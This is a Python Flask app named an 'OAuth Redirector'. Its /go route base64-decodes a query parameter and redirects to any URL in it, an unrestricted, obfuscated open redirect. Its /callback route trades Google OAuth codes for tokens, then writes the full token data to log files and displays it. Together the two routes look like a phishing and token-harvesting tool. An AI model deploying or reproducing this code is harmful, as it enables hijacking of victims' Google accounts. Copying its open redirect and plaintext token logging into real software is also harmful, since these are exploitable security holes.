from flask import Flask, request, redirect
import requests
import base64
import logging
import os

app = Flask(__name__)

# Replace with your real Google OAuth credentials
CLIENT_ID = ""
CLIENT_SECRET = ""
REDIRECT_URI = ""

# Set up logging
logging.basicConfig(filename='access.log', level=logging.INFO, format='%(asctime)s %(message)s')

@app.route('/')
def index():
    return "OAuth Redirector is live."

@app.route('/go')
def go():
    encoded = request.args.get('q')
    if not encoded:
        return "Missing 'q' parameter", 400

    try:
        decoded_bytes = base64.urlsafe_b64decode(encoded.encode())
        decoded_url = decoded_bytes.decode()
        logging.info(f"[REDIRECT] Redirecting to: {decoded_url}")
        return redirect(decoded_url)
    except Exception as e:
        logging.error(f"[ERROR] Base64 decode failed: {e}")
        return f"Invalid base64 input: {e}", 400

@app.route('/callback')
def callback():
    code = request.args.get("code")
    if not code:
        return "Missing authorization code", 400

    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "code": code,
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code"
    }

    try:
        response = requests.post(token_url, data=data)
        response.raise_for_status()
        token_data = response.json()

        # Save token to log file
        with open("tokens.log", "a") as f:
            f.write(f"[TOKEN RECEIVED]\n{token_data}\n\n")

        logging.info(f"[TOKEN] {token_data}")
        return f"<h2>Access Granted</h2><pre>{token_data}</pre>"

    except requests.exceptions.RequestException as e:
        logging.error(f"[TOKEN ERROR] {str(e)}")
        return f"<h2>Token exchange failed:</h2><pre>{str(e)}</pre>", 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
